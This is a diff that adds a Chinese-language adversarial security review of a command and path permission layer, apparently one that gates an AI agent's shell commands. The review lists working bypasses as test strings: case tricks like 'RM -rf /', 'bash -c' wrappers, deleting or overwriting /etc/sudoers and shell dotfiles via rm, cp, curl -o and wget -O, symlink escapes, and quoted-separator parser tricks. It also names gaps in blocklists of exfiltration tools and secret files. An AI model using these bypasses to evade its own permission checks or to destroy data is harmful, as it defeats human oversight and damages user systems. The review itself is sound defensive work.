@@ -2115,6 +2115,141 @@ git commit -m "feat(permission): 内置不可绕过的危险路径/命令检查"
 
 ---
 
+### Task 4R: 命令层的五个绕过（对抗性审查，全部实测）
+
+> **结论：这一层的核心安全主张目前不成立。** spec 符合性通过（35/35，三条开篇要求全落实），
+> 但对抗审查找到 **5 个 Critical**，全部**不在**实现方自己那份 18 条缺口清单上，
+> 且每一个都能击穿本层的招牌例子 `rm -rf /`。
+>
+> **根因是一句话**：这一层的设计原则是「按结构判定，不靠黑名单」——
+> 在它真正贯彻的地方（目标拼写、路径分段）它赢了，实测 `rm -rf /*`、`//`、`/../`、`../..`、
+> `$HOME`、`-- /`、`\rm`、`/bin/rm`、`env`/`nice`/`timeout` 前缀全部拦住；
+> 而在它退回「列出危险命令名」的地方（`DELETE_COMMANDS` / `WRITER_COMMANDS` / `BULK_COPY_COMMANDS`），
+> 它输给了 `cp`、输给了 `bash -c`、输给了一个大写的 `R`。
+>
+> **修复方向不是继续加名字**：凡是**指名了落点**的命令，都应把那个落点送进 `checkWrite`，
+> 而不是由「命令名在不在某张表里」决定这道检查跑不跑。
+> `install` 之所以被拦住，只是因为它恰好被填进了另一张表。
+
+- [ ] **C1: `headCommand` 没做小写化，整个命令层可被大小写绕过**
+
+`DangerousPaths.java:519` 的 `headCommand` 返回 `c.substring(c.lastIndexOf('/') + 1)`，**无 `toLowerCase`**，
+而四张命令表全是小写。实测全部 MISS：
+
+```
+RM -rf /        Rm -Rf /Users/zxh     SUDO rm -rf /      /bin/RM -rf /
+ENV rm -rf /    Tee ~/.zshrc          DD if=/dev/zero of=/dev/disk0
+```
+
+**这在本平台上不是纸面问题**（审查方在本机实测）：
+```
+$ ls -l /bin/LS            → -rwxr-xr-x root wheel /bin/LS
+$ /bin/bash -c 'LS -d /'   → /   (exit 0)
+```
+APFS 大小写不敏感，`RM -rf /` 照常执行。而类 javadoc `:31-40` 花了十行论证「恒按大小写不敏感比较」——
+小写化只落在 `segments()`（`:745`）里，**只作用于路径**。既有测试 `caseVariantsDoNotEvade`（test:172）
+只测路径，所以这个洞在测试里是隐形的。**修法：`headCommand` 里加一次小写化。**
+
+- [ ] **C2: `bash -c` / 解释器 `-c` 完全未建模**
+
+shell 既不在 `COMMAND_WRAPPERS`（`:186`）也无特殊处理，引号里的载荷永远不会变成一个段。实测全部 MISS：
+
+```
+bash -c "rm -rf /"      sh -c 'rm -rf /'      zsh -c "rm -rf ~"
+sudo bash -c "rm -rf /"  python3 -c "import shutil;shutil.rmtree('/')"
+perl -e 'unlink glob "/*"'   ssh host 'rm -rf /'
+```
+
+**本仓库自己已经知道这件事**：`BashCommandSplitter` 的 javadoc `:20-22` 正是拿
+`bash -c 'echo hi\nrm -rf /'` 当作「换行必须算分隔符」的立论依据。上游知道，本层没接住。
+
+- [ ] **C3: 删除目标从不经过 `checkWrite`，且非递归删除完全不检查**
+
+`checkSegment`（`:365-420`）只对重定向落点与 `WRITER_COMMANDS` 调 `checkWrite`；
+`rm` 的目标走 `checkDeleteTargets`（`:450`），而后者**以 `hasRecursiveFlag` 为门**、且只判**结构位置**
+（根 / 顶层 / home / 根的祖先）。实测全部 MISS：
+
+```
+rm -f /etc/sudoers    rm /etc/passwd      rmdir /etc        rm -f ~/.zshrc
+rm ~/.bashrc          rm -f ~/.gitconfig  rm -f /usr/local/bin/git
+rm -f ~/Library/LaunchAgents/x.plist      shred -u ~/.zshrc
+rm -rf /etc/sudoers   rm -rf /usr/local/bin   rm -rf /System/Volumes/Data
+```
+
+对照极其刺眼：`checkWrite(~/.zshrc)` 返回理由，`rm -f ~/.zshrc` 返回 null——
+**本层保护一个文件不被写，却不保护它不被删。**
+
+- [ ] **C4: `cp` / `mv` / `curl -o` / `wget -O` / `scp` 的落点从不当作写检查**
+
+`BULK_COPY_COMMANDS`（`:194`）的参数只过 `touchesSensitiveDir`（判「最后一段是不是密钥目录名」）
+与通用读循环，**落点从不进 `checkWrite`**。实测全部 MISS：
+
+```
+cp evil /usr/local/bin/git      cp evil ~/.zshrc        mv evil ~/.bashrc
+curl -o /etc/sudoers http://x   wget -O ~/.zshrc http://x
+scp evil host:/etc/sudoers      sudo cp evil /etc/sudoers    tar -xf payload.tar -C /
+```
+
+同一动作的对照组**被拦住**：`install evil /usr/local/bin/git` → 有理由，`tee ~/.zshrc` → 有理由。
+差别只在 `install`/`tee` 恰好在 `WRITER_COMMANDS` 里。
+于是**最新、防守最密的 `WRITABLE_ROOTS` 白名单，被系统上最普通的一条命令 `cp` 整个绕开**——
+而 `cp evil /usr/local/bin/git` 正是该白名单 javadoc `:166-169` 自述的存在理由（PATH 劫持）。
+
+- [ ] **C5: 不可解析回退会「反转」——加个引号内分隔符，把「拦住」变成「漏过」**
+
+`split` 在分隔符出现在引号内时返回 `parseable=false`，于是 `segmentsToCheck`（`:661`）回退到
+`lenientSplit`；而 lenient 不认引号，**会从 `rm` 和它的目标之间切开**。整串扫描也救不回来——
+整串的 head 是 `echo`/`git`，删除检查根本不触发。实测：
+
+```
+echo ab      ; rm -rf pq   /        → 拦住
+echo "a;b"   ; rm -rf "p;q" /       → MISS
+git commit -m "fix; ship" && rm -rf "a;b" /   → MISS
+echo "a;b"; tee "x;y" ~/.zshrc      → MISS
+```
+
+最后一条是完全自然的命令行。`:657` 那句「宁可多问，绝不因为看不懂就放过」，
+**对每一个依赖 head 的检查都是假的**——只有重定向与读循环幸存，因为它们无条件扫描所有词。
+
+**修法（需要设计，不是补名字）**：命令不可解析时，本层**不得依赖 head 位置**。
+改为：扫描每一个词，任何词命中删除/写入/批量拷贝命令名即 ASK；任何词命中敏感目标即 ASK。
+过宽，但本层只产出 ASK，方向正确。
+
+---
+
+**Important（11 条，择要）**
+
+- **I1 符号链接两步就能架空 `WRITABLE_ROOTS`**：`ln` 不在任何命令表里。
+  实测 `ln -s /etc <root>/link` → MISS，随后 `checkWrite(<root>/link/sudoers)` → MISS。
+  `toRealPath()` 已被正确排除（必须支持写不存在的文件），故修法须另寻。
+- **I3 `$TMPDIR` 不在 `WRITABLE_ROOTS`**：macOS 真实临时目录是 `/var/folders/…/T/`，
+  即 `java.io.tmpdir` 的值。每一次 `mktemp`、每一个构建临时文件都弹窗——
+  正是该类 javadoc 自述必须避免的审批疲劳，且落在频率最高的写上。加 `/var/folders` 或读 `java.io.tmpdir`。
+- **I6 `root` 取在敏感位置之上会静默关掉整个兜底**：实测 `checkWrite("/etc/sudoers", root=/)` → null。
+  无人拒绝 `root=/`，也无测试覆盖 `/work/proj` 之外的 root。
+- **I7 测试只钉了每张表的一个样本，表本身没被钉住**：审查方把九张表缩到只剩测试用到的条目，
+  **35/35 仍然全绿**。被删掉且无测试报警的包括 `curl` `wget` `scp` `base64` `openssl`（整个网络外传半边）、
+  `install`、`rmdir` `shred` `srm`、`xargs` `eval` `exec` `nohup` `doas`、`.netrc` `.pgpass` `.pypirc`、
+  `.pfx` `.keystore` `.ppk`、`.kube/config` 等。
+  **对一个价值全在「这张表是完整的」的组件，删掉 40% 条目还全绿是不可接受的**——
+  断言须由常量表驱动，或直接断言集合成员关系。
+- **I4/I5/I8/I9 归错表或漏收**：`~/.npmrc` 写受保护、读不受保护（里面是 `_authToken`）；
+  `~/.gitconfig` 拦住而 `~/.config/git/config` 漏（同一个文件、同样可劫持 `core.pager`）；
+  `/etc/ssh/ssh_host_*_key` 读得干干净净；`.envrc`（direnv，落盘即执行）在项目内漏，
+  而 `ACCEPT_EDITS` 恰好自动放行项目内写。
+- **I10 `~/.ssh/environment` 不该在公开文件白名单里**——sshd 会读它，实践中有人往里放 token。
+- **I11 `checkSecretFile` 的理由不含路径**：面板上 `<root>/.env` 与 `/Users/other/.env` 长得一模一样，
+  而用户正是在判断「这一次访问是否正当」。其余 12 条理由都带路径，补齐即可。
+
+**Minor**：`/dev` 成了整个可写子树（`:253` 要求恰好 2 段）；`:248` 用 `indexOf` 而非 `lastIndexOf`；
+**761 行是两个职责**——后一半是手写 shell 词法器，`words()`（`:717`）与
+`BashCommandSplitter:238` **逐字相同**，且「一个段的首词」现在有**两个互相矛盾的定义**
+（`firstWord("sudo rm -rf /")` = `sudo`，`headCommand(...)` = `rm`）。
+本仓库已有 `PredicateConsistencyTest` / `SeparatorSetConsistencyTest` 这个先例，
+而这三处重复没有任何一致性测试覆盖。
+
+---
+
 ### Task 5: permissions.json 两层加载
 
 **Files:**
